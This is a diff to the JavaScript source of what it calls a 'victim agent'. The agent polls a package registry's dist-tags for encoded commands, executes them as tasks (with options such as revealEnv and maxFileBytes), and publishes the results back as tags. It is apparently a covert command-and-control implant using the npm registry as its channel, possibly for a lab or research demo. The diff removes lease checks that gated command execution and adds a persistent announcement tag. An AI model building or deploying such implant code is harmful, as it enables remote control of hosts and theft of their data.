@@ -10,32 +10,30 @@
 //  - SIGINT/SIGTERM flush state and exit cleanly
 
 import fs from 'node:fs';
-import os from 'node:os';
 import path from 'node:path';
 import crypto from 'node:crypto';
 import { pathToFileURL } from 'node:url';
-import { channelTimings, loadConfig, configArgFromArgv } from '../common/config.js';
+import { loadConfig, configArgFromArgv } from '../common/config.js';
 import { createLogger } from '../common/logger.js';
 import {
   PINNED_VERSION,
-  decodeAnnounceTag,
   decodeCommandTag,
   encodeAnnounceTag,
   encodeResultTags,
-  isAnnounceTag,
   isCommandTag,
 } from '../common/protocol.js';
 import { RegistryClient } from '../common/registry.js';
 import { runTask } from './tasks.js';
 
 const MAX_BACKOFF_SEC = 300;
+const COMMAND_BASELINE_VERSION = 1;
 
 // ---------------------------------------------------------------------------
 // state file
 // ---------------------------------------------------------------------------
 
 export function defaultState() {
-  return { agentId: '', lastSeq: {} };
+  return { agentId: '', lastSeq: {}, commandBaselineVersion: 0 };
 }
 
 export function loadState(statePath) {
@@ -44,6 +42,9 @@ export function loadState(statePath) {
     return {
       agentId: typeof raw.agentId === 'string' ? raw.agentId : '',
       lastSeq: raw.lastSeq && typeof raw.lastSeq === 'object' ? raw.lastSeq : {},
+      commandBaselineVersion: raw.commandBaselineVersion === COMMAND_BASELINE_VERSION
+        ? COMMAND_BASELINE_VERSION
+        : 0,
     };
   } catch {
     return defaultState();
@@ -55,6 +56,17 @@ export function saveState(statePath, state) {
   fs.mkdirSync(path.dirname(path.resolve(statePath)), { recursive: true });
   fs.writeFileSync(tmp, JSON.stringify(state, null, 2));
   fs.renameSync(tmp, statePath); // atomic-ish: never leave a half-written state file
+}
+
+/** Reset command progress when the configured identity changes. */
+export function applyAgentIdentity(state, agentId) {
+  if (state.agentId === agentId) return state;
+  return {
+    ...state,
+    agentId,
+    lastSeq: {},
+    commandBaselineVersion: 0,
+  };
 }
 
 // ---------------------------------------------------------------------------
@@ -94,56 +106,30 @@ export function selectCommands(distTags, state, agentId) {
   return { commands, skipped };
 }
 
-export function isCommandExpired(payload, now, taskTtlMs) {
-  const sentAt = Number(payload?.ts);
-  if (!Number.isFinite(sentAt)) return Number.isFinite(taskTtlMs);
-  return now - sentAt >= taskTtlMs;
+/** One deterministic discovery tag per agent, reused across every restart. */
+export function encodeStableAnnouncementTag(agentId) {
+  return encodeAnnounceTag(agentId, { v: 1 });
 }
 
-export function encodeHeartbeatTag(agentId, payload) {
-  const clip = (value) => typeof value === 'string' ? value.slice(0, 40) : undefined;
-  const candidates = [
-    payload,
-    { ts: payload.ts, lease: payload.lease, cwd: clip(payload.cwd), host: clip(payload.host) },
-    { ts: payload.ts, lease: payload.lease, host: clip(payload.host) },
-    { ts: payload.ts, lease: payload.lease },
-  ];
-  let lastError;
-  for (const candidate of candidates) {
+/**
+ * On first run after installation or upgrade, ignore command tags that were
+ * already present. The returned state is a new object; completed baselines are
+ * returned unchanged so restarts can process commands queued while offline.
+ */
+export function createCommandBaseline(distTags, state, agentId) {
+  if (state.commandBaselineVersion === COMMAND_BASELINE_VERSION) return state;
+  const lastSeq = { ...state.lastSeq };
+  for (const name of Object.keys(distTags)) {
+    if (!isCommandTag(name)) continue;
     try {
-      return encodeAnnounceTag(agentId, candidate);
-    } catch (err) {
-      lastError = err;
+      const command = decodeCommandTag(name);
+      if (command.agentId !== agentId && command.agentId !== 'all') continue;
+      lastSeq[command.agentId] = Math.max(lastSeq[command.agentId] ?? 0, command.seq);
+    } catch {
+      // Malformed tags are ignored during baselining and reported by later polls.
     }
   }
-  throw lastError;
-}
-
-export async function publishHeartbeat({
-  client,
-  agentId,
-  distTags,
-  now,
-  cwd,
-  host,
-  lease,
-  onPublished,
-  logger,
-}) {
-  const tag = encodeHeartbeatTag(agentId, { ts: now, cwd, host, lease });
-  await client.setDistTag(tag, PINNED_VERSION);
-  onPublished?.(tag);
-
-  for (const oldTag of Object.keys(distTags)) {
-    if (oldTag === tag || !isAnnounceTag(oldTag)) continue;
-    try {
-      if (decodeAnnounceTag(oldTag).agentId !== agentId) continue;
-      await client.deleteDistTag(oldTag);
-    } catch (err) {
-      logger.warn(`failed to clean old heartbeat "${oldTag}": ${err.message}`);
-    }
-  }
-  return tag;
+  return { ...state, lastSeq, commandBaselineVersion: COMMAND_BASELINE_VERSION };
 }
 
 /**
@@ -186,7 +172,6 @@ export async function publishResultTags(client, tags, { logger, rounds = 3 } = {
  * @param {object} deps.logger
  * @param {Function} [deps.save] persist callback, called after each state change
  * @param {object} [deps.limits] task limits, e.g. { maxFileBytes, revealEnv }
- * @param {Set<string>} [deps.validLeases] recently published heartbeat leases
  * @returns {Promise<{executed: number, resultsPublished: number, skipped: number}>}
  */
 export async function processDistTags({
@@ -197,7 +182,6 @@ export async function processDistTags({
   logger,
   save,
   limits = {},
-  validLeases = null,
 }) {
   const { commands, skipped } = selectCommands(distTags, state, agentId);
   for (const s of skipped) {
@@ -206,23 +190,7 @@ export async function processDistTags({
 
   let resultsPublished = 0;
   let executed = 0;
-  let rejected = 0;
   for (const cmd of commands) {
-    const invalidLease = validLeases instanceof Set
-      && (cmd.agentId === 'all' || !validLeases.has(cmd.payload?.lease));
-    if (invalidLease) {
-      state.lastSeq[cmd.agentId] = cmd.seq;
-      if (save) save();
-      rejected++;
-      logger.warn(`missing or stale lease for seq ${cmd.seq} (target ${cmd.agentId}); command was not executed`);
-      try {
-        await client.deleteDistTag(cmd.tag);
-      } catch (err) {
-        logger.warn(`failed to delete stale command "${cmd.tag}": ${err.message}`);
-      }
-      continue;
-    }
-
     logger.info(`executing seq ${cmd.seq} (target ${cmd.agentId}): op=${cmd.payload.op}`);
     executed++;
     const result = runTask(cmd.payload.op, cmd.payload.args ?? {}, limits);
@@ -261,7 +229,7 @@ export async function processDistTags({
     }
   }
 
-  return { executed, resultsPublished, skipped: skipped.length + rejected };
+  return { executed, resultsPublished, skipped: skipped.length };
 }
 
 // ---------------------------------------------------------------------------
@@ -270,36 +238,6 @@ export async function processDistTags({
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
-/**
- * Publish heartbeats on an independent async schedule so sequential registry
- * writes for task results cannot starve presence updates.
- */
-export async function runHeartbeatLoop({
-  heartbeatMs,
-  isRunning,
-  publish,
-  logger,
-  sleepFn = sleep,
-  nowFn = Date.now,
-  sleepSliceMs = 200,
-}) {
-  while (isRunning()) {
-    const startedAt = nowFn();
-    try {
-      await publish();
-      logger?.debug('heartbeat published');
-    } catch (err) {
-      logger?.warn(`failed to publish heartbeat: ${err.message}`);
-    }
-
-    const remainingMs = Math.max(0, heartbeatMs - (nowFn() - startedAt));
-    for (let slept = 0; isRunning() && slept < remainingMs; slept += sleepSliceMs) {
-      const slice = Math.min(sleepSliceMs, remainingMs - slept);
-      await sleepFn(slice);
-    }
-  }
-}
-
 async function main() {
   const cfg = loadConfig(configArgFromArgv());
   const logger = createLogger({
@@ -307,14 +245,14 @@ async function main() {
     logFile: cfg.logFile,
   });
   const statePath = cfg.stateFile || 'victim-state.json';
-  const state = loadState(statePath);
+  let state = loadState(statePath);
   const save = () => saveState(statePath, state);
 
   if (cfg.agentId) {
-    state.agentId = cfg.agentId;
+    state = applyAgentIdentity(state, cfg.agentId);
   }
   if (!state.agentId) {
-    state.agentId = 'a' + crypto.randomBytes(4).toString('hex');
+    state = applyAgentIdentity(state, 'a' + crypto.randomBytes(4).toString('hex'));
     logger.info(`generated new agentId: ${state.agentId}`);
   }
   save();
@@ -325,7 +263,6 @@ async function main() {
     token: cfg.token,
     logger,
   });
-  const timings = channelTimings(cfg.pollIntervalSec);
 
   logger.info(`victim agent ${state.agentId} starting`);
   logger.info(`registry=${cfg.registryUrl} package=${cfg.packageName} poll=${cfg.pollIntervalSec}s`);
@@ -351,37 +288,27 @@ async function main() {
   process.on('SIGINT', shutdown);
   process.on('SIGTERM', shutdown);
 
-  let heartbeatTag = '';
-  let heartbeatLeases = [];
-  const heartbeatPromise = runHeartbeatLoop({
-    heartbeatMs: timings.heartbeatMs,
-    isRunning: () => running,
-    logger,
-    publish: async () => {
-      const distTags = await client.getDistTags();
-      const lease = crypto.randomBytes(6).toString('hex');
-      heartbeatTag = await publishHeartbeat({
-        client,
-        agentId: state.agentId,
-        distTags,
-        now: Date.now(),
-        cwd: process.cwd(),
-        host: os.hostname(),
-        lease,
-        onPublished: () => {
-          heartbeatLeases = [...heartbeatLeases, lease].slice(-4);
-        },
-        logger,
-      });
-    },
-  });
-
+  let announced = false;
   let consecutiveFailures = 0;
   while (running) {
     let delaySec = cfg.pollIntervalSec;
     try {
       const distTags = await client.getDistTags();
       consecutiveFailures = 0;
+      if (state.commandBaselineVersion !== COMMAND_BASELINE_VERSION) {
+        state = createCommandBaseline(distTags, state, state.agentId);
+        save();
+        logger.info('existing commands baselined; only later commands will execute');
+      }
+      if (!announced) {
+        try {
+          await client.setDistTag(encodeStableAnnouncementTag(state.agentId), PINNED_VERSION);
+          announced = true;
+          logger.info('stable announce tag published');
+        } catch (err) {
+          logger.warn(`failed to publish stable announce tag: ${err.message}`);
+        }
+      }
       const stats = await processDistTags({
         distTags,
         state,
@@ -390,7 +317,6 @@ async function main() {
         logger,
         save,
         limits: { maxFileBytes: cfg.maxFileBytes, revealEnv: cfg.revealEnv },
-        validLeases: new Set(heartbeatLeases),
       });
       if (stats.executed > 0 || stats.skipped > 0) {
         logger.info('cycle summary', stats);
@@ -408,14 +334,6 @@ async function main() {
     }
   }
 
-  await heartbeatPromise;
-  if (heartbeatTag) {
-    try {
-      await client.deleteDistTag(heartbeatTag);
-    } catch (err) {
-      logger.warn(`failed to remove heartbeat during shutdown: ${err.message}`);
-    }
-  }
   save();
   logger.close();
   process.exit(0);
